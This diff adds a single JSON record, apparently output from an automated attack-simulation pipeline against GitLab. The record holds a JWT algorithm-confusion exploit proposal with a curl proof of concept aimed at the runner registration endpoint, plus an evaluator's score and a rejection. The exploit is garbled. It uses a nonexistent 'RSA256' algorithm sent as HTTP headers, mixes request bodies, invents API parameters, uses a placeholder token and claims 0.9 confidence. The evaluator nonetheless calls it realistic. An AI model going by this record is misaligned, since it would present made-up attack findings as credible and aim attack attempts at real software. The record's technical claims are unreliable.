@@ -1,0 +1,18 @@
+{
+  "mode": "attack_sim",
+  "program": "GitLab",
+  "iteration": 4,
+  "attack": "## TITLE:  JWT Poisoning via Invalid Claims\nTARGET: POST /api/v4/runners\nTECHNIQUE: JWT algorithm confusion or weak signing\nSTEPS:\n1. **Exploiting the Missing Algorithm:** Craft a request with a specially designed JWT payload containing a custom algorithm parameter in the header. For example, include the following claims in the payload: `alg=RSA256` and `kid=xxx`. \n2. **Triggering the Vulnerable Service:**  Submit the request to the POST endpoint with the following parameters:\n    - `access_token`: `[a randomly generated JWT with a valid header and claims, but with the `alg` parameter set to `RSA256` and the `kid` parameter set to `xxx`]` \n    - `runner_name`: `[any valid name]`\n    - `runner_password`: `[any valid password]`\n3. **Successful Execution and Impact:** The server is vulnerable to this attack and will interpret the header value for the algorithm. \n\nPROOF OF CONCEPT:\n```bash\ncurl -X POST \\\n  -H \"Authorization: Bearer <jwt-token>\" \\\n  -H \"alg: RSA256\" \\\n  -H \"kid: xxx\" \\\n  -d '{\"access_token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNjI2MjM3MDIyfQ.S_I3_bM1j895lQ_09507k_8_Q_b_a_8_82_f_7_63_b_21_b7_20_8_7\" \\\n  -d \"runner_name=john_doe\" \\\n  -d \"runner_password=johndoe\" \\\n  -d \"runner_type=user\" \\\n  -d \"runner_email=johndoe@example.com\" \\\n  -d \"runner_description=test\" \\\n  -d \"project_name=test\" \\\n  -d \"private_key_file=test.pem\"\n``` \nEXPECTED IMPACT:  Successful registration of a user account with the attacker-controlled `runner_name`, `runner_password`, and the server may accept the malicious JWT payload.\nCONFIDENCE: 0.9",
+  "evaluation": {
+    "score": 0.65,
+    "realistic": true,
+    "in_scope": true,
+    "originality": "medium",
+    "weakness": "The attack relies on a specific implementation detail of the JWT algorithm, which may not be present in all cases. Additionally, the impact of the attack is limited to the ability to register a user account with the attacker-controlled `runner_name` and `runner_password`. The server may not accept the malicious JWT payload in all cases.",
+    "strength": "The attack demonstrates a realistic payload with actual values and correctly applies the technique to the named endpoint. The impact of the attack is specific and the confidence is realistic.",
+    "verdict": "reject"
+  },
+  "score": 0.65,
+  "verdict": "reject",
+  "timestamp": "2026-03-11-012353"
+}
